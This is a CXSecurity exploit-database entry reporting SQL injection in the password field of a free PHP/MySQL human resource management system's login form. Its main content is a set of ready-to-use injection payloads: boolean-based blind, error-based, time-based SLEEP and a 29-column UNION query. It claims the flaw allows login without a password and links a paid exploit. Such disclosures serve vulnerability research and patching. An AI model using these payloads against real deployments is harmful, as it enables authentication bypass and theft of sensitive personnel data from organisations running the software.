---
title: HRM-1.0-2025 Multiple-SQLi
url: https://cxsecurity.com/issue/WLB-2025060005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-09
fetch_date: 2025-10-06T22:50:13.146878
---

# HRM-1.0-2025 Multiple-SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **HRM-1.0-2025 Multiple-SQLi**  **2025.06.08**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: HRM-1.0-2025 Multiple-SQLi
# Author: nu11secur1ty
# Date: 06/06/2025
# Vendor: https://github.com/oretnom23
# Software: https://www.sourcecodester.com/php/15740/human-resource-management-system-project-php-and-mysql-free-source-code.html
# Reference: https://portswigger.net/web-security/sql-injection
## Description:
The password parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the password parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present. Additionally, the payload '+(select\*from(select(sleep(20)))a)+' was submitted in the password parameter. The application took 20011 milliseconds to respond to the request, compared with 3 milliseconds for the original request, indicating that the injected SQL command caused a time delay. The attacker can get all sensitive information from this system when he attacks it online, He can login super easily WITHOUT PASSWORD - ONLY USER - bypassing, and can crash or get every sensitive information from him!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
- SQLi:
```SQLi
---
Parameter: password (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: name=yQUccwZL@burpcollaborator.net&password=a9Z!d6c!S1' OR NOT 6152=6152# HdeE&submit=Sign In
Type: error-based
Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: name=yQUccwZL@burpcollaborator.net&password=a9Z!d6c!S1' OR (SELECT 1812 FROM(SELECT COUNT(\*),CONCAT(0x7170716a71,(SELECT (ELT(1812=1812,1))),0x716b6b7871,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)# eWoJ&submit=Sign In
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: name=yQUccwZL@burpcollaborator.net&password=a9Z!d6c!S1' AND (SELECT 5433 FROM (SELECT(SLEEP(7)))qgyD)# Altf&submit=Sign In
Type: UNION query
Title: MySQL UNION query (NULL) - 29 columns
Payload: name=yQUccwZL@burpcollaborator.net&password=a9Z!d6c!S1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170716a71,0x464a4546456d4a6a65717a5968475571697850644a4452416252794b54495273796650437252665a,0x716b6b7871),NULL#&submit=Sign In
---
```
# Reproduce:
[href](https://www.youtube.com/watch?v=rmvP\_hJGu3M)
# Buy an exploit only:
[href](https://satoshidisk.com/pay/COZf0l)
# Time spent:
01:37:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top